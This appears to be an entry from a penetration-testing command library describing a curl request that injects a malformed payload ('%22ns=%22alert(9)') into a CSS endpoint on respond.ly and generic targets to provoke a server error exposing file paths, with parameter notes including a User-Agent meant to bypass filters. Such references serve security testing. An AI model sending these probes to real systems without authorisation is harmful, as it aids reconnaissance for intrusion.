---
data: >-
  curl -X GET "http://respond.ly/css/shared/%22ns=%22alert(9)" -H
  "Cache-Control: no-cache" -H "User-Agent: Mozilla/5.0 (compatible; MSIE 8.0;
  Windows NT 6.1; Trident/4.0;)" -H "Accept-Language: en-us,en;q=0.5" -H
  "Accept-Encoding: gzip, deflate" --compressed
tags:
  - web-testing
  - information-disclosure
  - http-request
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:06.188Z'
id: e16bff89-4b55-4a15-a78a-248ac5696ebc
verified: false
validated: true
submitted: true
---
# curl-malformed-css-request

## Command

```bash
curl -X GET "http://respond.ly/css/shared/%22ns=%22alert(9)" -H "Cache-Control: no-cache" -H "User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0;)" -H "Accept-Language: en-us,en;q=0.5" -H "Accept-Encoding: gzip, deflate" --compressed
```

## Description

This command uses curl to send a malformed GET request to a web application's CSS endpoint, injecting a payload that triggers an internal server error and discloses full file paths in the response. It is used for testing information disclosure vulnerabilities in dynamic web apps.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| `"http://respond.ly/css/shared/%22ns=%22alert(9)"` | Target URL with malformed namespace payload to induce error | Yes |
| `-H "Cache-Control: no-cache"` | Disables caching to ensure fresh response | No |
| `-H "User-Agent: ..."` | Mimics an old browser to potentially bypass filters | No |
| `-H "Accept-Language: ..."` | Sets language preferences | No |
| `-H "Accept-Encoding: gzip, deflate"` | Requests compressed response | No |
| `--compressed` | Automatically decompresses gzip/deflate | No |

## Examples

### Basic Usage

```bash
curl -X GET "http://target.com/css/shared/%22ns=%22alert(9)" -H "User-Agent: Mozilla/5.0"
```

### Advanced Usage

```bash
curl -X GET "https://target.com/css/shared/%22ns=%22alert(9)" -H "Cache-Control: no-cache" -H "User-Agent: Mozilla/5.0 (compatible; MSIE 8.0;)" --output response.html --verbose
```

## Expected Output

A 500 Internal Server Error HTML response containing error details, such as stack traces with exposed paths (e.g., "Error loading /srv/www/app/releases/..."). Successful output includes absolute file system paths and deployment info; failure may return a generic 404 or 200 with normal CSS.

## Related

- [[Related Procedure: Exploit-Full-Path-Disclosure-in-CSS-Endpoint]]
